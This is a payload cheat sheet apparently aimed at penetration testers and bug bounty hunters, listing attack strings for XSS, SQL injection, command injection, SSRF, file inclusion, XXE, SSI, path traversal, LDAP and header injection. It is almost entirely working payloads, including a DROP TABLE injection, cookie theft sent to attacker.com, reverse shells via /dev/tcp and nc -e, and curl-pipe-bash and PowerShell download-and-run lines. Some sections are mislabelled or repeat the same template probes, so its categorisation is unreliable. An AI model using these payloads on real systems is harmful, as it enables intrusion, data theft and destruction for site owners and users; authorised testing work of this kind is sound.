  Payload Cheatsheet for Pentesters or Bug Bounty Hunters


Cross-Site Scripting (XSS) Payloads:

<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<video><source onerror="javascript:alert('XSS')">
"><img src=x onerror=alert('XSS')">


SQL Injection Payloads:

' OR 1=1 --
1'; DROP TABLE users; --
' UNION SELECT username, password FROM users --
1'; SELECT @@VERSION; --
' UNION SELECT table_name, column_name FROM information_schema.columns --


Command Injection Payloads:

; ls
| cat /etc/passwd
; id
&& echo "Attacker's command executed"
$(nc -nv attacker.com 4444)


Server-Side Request Forgery (SSRF) Payloads:

http://attacker.com
file:///etc/passwd
ftp://attacker.com
gopher://attacker.com
dict://attacker.com


Remote File Inclusion (RFI) Payloads:

http://attacker.com/evil_script.php
file:///etc/passwd
ftp://attacker.com/evil_script.php
expect://ls
php://input


Local File Inclusion (LFI) Payloads:

/etc/passwd
/etc/shadow
/proc/self/environ
/var/log/apache/access.log
/etc/hosts


Server-Side Template Injection (SSTI) Payloads:

{{7*'7'}}
${7*'7'}
#{7*'7'}
[[7*'7']]
=<%= 7*7 %>


XML External Entity (XXE) Payloads:

<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://ls">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8gV29ybGQh">]>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>


Cross-Site Request Forgery (CSRF) Payloads:

<img src="http://attacker.com/csrf?cookie="+document.cookie>
<form action="http://victim.com/change-password" method="POST"><input type="hidden" name="new_password" value="hacked"></form>
<iframe src="http://victim.com/logout"></iframe>
<script>fetch('http://attacker.com/csrf?cookie='+document.cookie)</script>
<link rel="stylesheet" href="http://attacker.com/malicious.css">
File Upload Bypass Payloads:

shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.php::$data.jpg
shell.php%20


Server-Side Includes (SSI) Injection Payloads:

<!--#exec cmd="ls" -->
<!--#exec cmd="/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" -->
<!--#exec cmd="/bin/nc -nv attacker.com 4444 -e /bin/bash" -->
<!--#exec cmd="curl http://attacker.com/evil.sh | bash" -->
<!--#exec cmd="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')" -->


Path Traversal Payloads:

../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
.././.././.././../etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd


XXE Out-of-Band (OOB) Payloads:

<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">%ext;]>
<!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">%payload;
<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;
<!ENTITY % xxe SYSTEM "expect://ls">%xxe;
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">%xxe;


LDAP Injection Payloads:

*
*))(|(password=*))
)(userPassword=*))(|(uid=*))
*%28|%28password%3D*%29
*%29%28%7C%28password%3D*%29


Server-Side JavaScript Injection Payloads:

</script><script>alert('XSS')</script>
</script><img src="x" onerror="alert('XSS')">
</script><svg/onload=alert('XSS')>
</script><video><source onerror="javascript:alert('XSS')">
</script>alert('XSS')//


Open Redirect Payloads:

http://attacker.com
//attacker.com
//attacker.com/evil_script.js
/%2F%2Fattacker.com
/%2F%2Fattacker.com/evil_script.js


Remote Code Execution (RCE) Payloads:

${{7*'7'}}
{{7*'7'}}
#{7*'7'}
[[7*'7']]
= 7*7


Cross-Origin Resource Sharing (CORS) Bypass Payloads:

Origin: https://attacker.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: null
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true


Server-Side Code Injection Payloads:

${7*'7'}
{{7*'7'}}
#{7*'7'}
[[7*'7']]
= 7*7


Remote File Download Payloads:

http://attacker.com/evil_file
file:///etc/passwd
ftp://attacker.com/evil_file
gopher://attacker.com/evil_file
data:text/plain;base64,SGVsbG8gV29ybGQ=


Insecure Direct Object Reference (IDOR) Payloads:

user=1
user=admin
user[]=1
user[]=admin
user=admin&role=admin


HTTP Header Injection Payloads:

User-Agent: <script>alert('XSS')</script>
Referer: http://attacker.com
Location: http://attacker.com
X-Forwarded-For: attacker.com
Host: attacker.com


LDAP Injection Search Filters:

*)(uid=*))(|(password=*))
*))(|(userPassword=*))(|(uid=*))
*))(|(userPassword=*))(|(uid=*))
*)(userPassword=*))(|(uid=*))
*%29%28%7C%28password%3D*%29


XML Injection Payloads:

<foo>]]&gt;<bar>
<foo><![CDATA[<]]>script>alert('XSS')//]]></foo>
<foo><!ENTITY xxe SYSTEM "file:///etc/passwd"></foo>
<foo><!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"></foo>
<foo><!ENTITY xxe SYSTEM "expect://ls"></foo>


Host Header Injection Payloads:

Host: attacker.com
Host: attacker.com%0d%0aX-Forwarded-For: 127.0.0.1
Host: attacker.com%0d%0aReferer: http://attacker.com
Host: attacker.com%0d%0aLocation: http://attacker.com
Host: attacker.com%0d%0aCookie: session=abc
